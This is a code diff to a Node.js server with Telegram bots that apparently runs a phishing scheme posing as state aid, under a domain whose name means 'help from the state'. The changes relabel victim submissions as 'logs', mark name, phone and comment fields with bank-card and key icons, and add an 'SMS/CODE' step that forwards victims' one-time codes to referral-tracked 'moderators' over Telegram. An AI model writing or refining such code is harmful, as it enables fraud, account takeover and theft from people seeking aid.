@@ -64,8 +64,8 @@ workerBot.onText(/\/addmod/, (msg) => {
   workerBot.sendMessage(adminId,
 `✅ Модератор добавлен
 
-👤 ${user.username ? "@" + user.username : user.first_name}
-🔗 https://your-site.com/?ref=${ref}`);
+ ${user.username ? "@" + user.username : user.first_name}
+🔗 https://dopomogavidderzhavii.vercel.app/?ref=${ref}`);
 });
 
 // ===== ВХОД =====
@@ -75,7 +75,7 @@ app.post("/enter", (req, res) => {
 
   onlineUsers[id] = Date.now();
 
-  enterBot.sendMessage(adminId, `👀 Вход\n🆔 ${id}`).catch(()=>{});
+  enterBot.sendMessage(adminId, `👀Переход по ссылке!\n🆔 ${id}`).catch(()=>{});
 
   res.json({ ok: true });
 });
@@ -98,7 +98,7 @@ app.post("/send", (req, res) => {
   const isRepeat = seenUsers[id];
   seenUsers[id] = true;
 
-  const statusText = isRepeat ? "🔁 ПОВТОРНАЯ ЗАЯВКА" : "🆕 НОВАЯ ЗАЯВКА";
+  const statusText = isRepeat ? "Повторный Лог♻️" : "👻Новый Лог🔥";
 
   const ref = d.ref;
   let modText = "—";
@@ -112,20 +112,20 @@ app.post("/send", (req, res) => {
 
 🆔 ID: ${id}
 
-📦 ${d.service}
-👤 ${d.name}
-📞 ${d.phone}
-📧 ${d.email}
-🏙 ${d.city}
-💬 ${d.comment}
+🏧 ${d.service}
+🗝️ ${d.name}
+📱 ${d.phone}
+📆 ${d.email}
+⛓️‍💥 ${d.city}
+💳 ${d.comment}
 
-👤 Модератор: ${modText}`;
+: ${modText}`;
 
-  const shortText = `📦 ${d.service}
-👤 ${d.name}
-📞 ${d.phone}
+  const shortText = `🏧 ${d.service}
+🏧 ${d.service}
+📱 ${d.phone}
 
-👤 ${modText}`;
+ ${modText}`;
 
   fullRequests[id] = fullText;
   shortRequests[id] = shortText;
@@ -157,7 +157,7 @@ app.post("/send2", (req, res) => {
   if (!who) return res.json({ ok: false });
 
   workerBot.sendMessage(who,
-`📩 ДОП ДАННЫЕ
+`📩 SMS/CODE 
 
 🆔 ${id}
 💬 ${data.value}`).catch(()=>{});
@@ -198,7 +198,7 @@ workerBot.on("callback_query", async (q) => {
             { text: "🚫 Бан", callback_data: "ban_" + id },
             { text: "✅ Разбан", callback_data: "unban_" + id }
           ],
-          [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
+          [{ text: "➡️ SMS/CODE", callback_data: "allow_" + id }]
         ]
       }
     });
